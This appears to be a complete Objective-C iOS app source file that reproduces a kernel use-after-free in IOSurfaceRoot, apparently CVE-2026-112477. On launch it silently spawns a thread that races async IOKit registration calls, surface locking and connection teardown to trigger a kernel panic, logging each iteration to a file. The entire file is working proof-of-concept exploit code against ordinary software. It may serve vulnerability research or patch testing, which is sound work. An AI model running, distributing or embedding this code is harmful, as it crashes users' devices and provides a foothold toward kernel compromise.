// israce-probe: CVE-2026-112477 on-device repro (iOS 27.0.1, 24A446)
// Reimplemented from the public research writeup (Kimi-2011/ios27-iosurface-uaf).
// App-reachable kernel UAF in IOSurfaceRoot: async sel-17 register, surface freed
// while its registry node survives, teardown traversal derefs freed owner -> MTE panic.
#import <UIKit/UIKit.h>
#import <CoreFoundation/CoreFoundation.h>
#import <pthread.h>
#import <mach/mach_port.h>
#import <mach/mach_init.h>

// IOKit + IOSurface exist in the iOS SDK as linkable frameworks but ship no public
// headers, so prototypes are declared here.
typedef mach_port_t io_object_t, io_connect_t, io_iterator_t;
extern mach_port_t kIOMasterPortDefault;
kern_return_t IOServiceGetMatchingServices(mach_port_t, CFDictionaryRef, io_iterator_t *);
io_object_t IOServiceGetMatchingService(mach_port_t, CFDictionaryRef);
CFMutableDictionaryRef IOServiceMatching(const char *);
kern_return_t IOServiceOpen(io_object_t, task_t, uint32_t, io_connect_t *);
kern_return_t IOObjectRelease(io_object_t);
kern_return_t IOConnectCallAsyncMethod(mach_port_t, uint32_t, mach_port_t, uint64_t *, uint32_t,
    const void *, size_t, const void *, size_t, void *, size_t *, void *, size_t *);

typedef struct __IOSurface *IOSurfaceRef;
extern IOSurfaceRef IOSurfaceCreate(CFDictionaryRef);
extern kern_return_t IOSurfaceLock(IOSurfaceRef, uint32_t, uint32_t *);
extern kern_return_t IOSurfaceUnlock(IOSurfaceRef, uint32_t, uint32_t *);

#define SEL_REG 17
static FILE *gLog = NULL;

static IOSurfaceRef mkSurface(void) {
    int w = 64, h = 4, bpe = 4, pf = 0x42475241;
    CFNumberRef W = CFNumberCreate(NULL, kCFNumberIntType, &w);
    CFNumberRef H = CFNumberCreate(NULL, kCFNumberIntType, &h);
    CFNumberRef B = CFNumberCreate(NULL, kCFNumberIntType, &bpe);
    CFNumberRef P = CFNumberCreate(NULL, kCFNumberIntType, &pf);
    const void *k[4] = { CFSTR("IOSurfaceWidth"), CFSTR("IOSurfaceHeight"),
                         CFSTR("IOSurfaceBytesPerElement"), CFSTR("IOSurfacePixelFormat") };
    const void *v[4] = { W, H, B, P };
    CFDictionaryRef d = CFDictionaryCreate(NULL, k, v, 4,
        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
    IOSurfaceRef s = IOSurfaceCreate(d);
    CFRelease(d); CFRelease(W); CFRelease(H); CFRelease(B); CFRelease(P);
    return s;
}

static volatile int gRun = 0;
static void *spamLock(void *arg) {
    IOSurfaceRef s = (IOSurfaceRef)arg;
    uint32_t seed = 0;
    while (gRun) {
        IOSurfaceLock(s, 0, &seed);
        IOSurfaceUnlock(s, 0, &seed);
    }
    return NULL;
}

static int runProbe(void) {
    io_object_t svc = IOServiceGetMatchingService(kIOMasterPortDefault,
        IOServiceMatching("IOSurfaceRoot"));
    if (!svc) { fprintf(gLog, "ERR no IOSurfaceRoot\n"); fflush(gLog); return -1; }
    uint64_t in[3] = { 1, 2, 3 };
    uint64_t ref = 0x1122334455667788ull;
    uint32_t soc = 0;
    pthread_t th[4];

    for (int iter = 0; iter < 200; iter++) {
        io_connect_t c = 0;
        mach_port_t wp = MACH_PORT_NULL;
        if (IOServiceOpen(svc, mach_task_self(), 0, &c) != KERN_SUCCESS) continue;
        mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &wp);
        // async register: sync path never fills args+0x10 (reference array) -> BadArgument
        kern_return_t r = IOConnectCallAsyncMethod(c, SEL_REG, wp, &ref, 1,
            NULL, 0, in, 24, NULL, &soc, NULL, NULL);
        IOSurfaceRef s = mkSurface();
        if (r == KERN_SUCCESS && s) {
            gRun = 1;
            for (int i = 0; i < 4; i++) pthread_create(&th[i], NULL, spamLock, s);
            usleep(200 + (iter % 40) * 25);
            IOServiceClose(c);       // teardown traversal hits the stale node here
            usleep(300);
            gRun = 0;
            for (int i = 0; i < 4; i++) pthread_join(th[i], NULL);
            CFRelease(s);
        } else {
            if (s) CFRelease(s);
            IOServiceClose(c);
        }
        fprintf(gLog, "iter %d rc=0x%x\n", iter, (uint32_t)r);
        fflush(gLog);
        mach_port_mod_refs(mach_task_self(), wp, MACH_PORT_RIGHT_RECEIVE, -1);
    }
    IOObjectRelease(svc);
    return 0;
}

static void *probeThread(void *arg) {
    (void)arg;
    NSArray *dirs = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
    NSString *path = [dirs[0] stringByAppendingPathComponent:@"israce.log"];
    gLog = fopen(path.fileSystemRepresentation, "w");
    if (!gLog) return NULL;
    fprintf(gLog, "probe start\n"); fflush(gLog);
    runProbe();
    fprintf(gLog, "probe end (no panic)\n"); fflush(gLog);
    fclose(gLog);
    return NULL;
}

@interface AppDelegate : UIResponder <UIApplicationDelegate>
@property (strong) UIWindow *window;
@end
@implementation AppDelegate
- (BOOL)application:(UIApplication *)application didFinishLaunchingWithOptions:(NSDictionary *)options {
    pthread_t t; pthread_create(&t, NULL, probeThread, NULL);
    return YES;
}
@end

int main(int argc, char *argv[]) {
    @autoreleasepool {
        return UIApplicationMain(argc, argv, nil, NSStringFromClass([AppDelegate class]));
    }
}
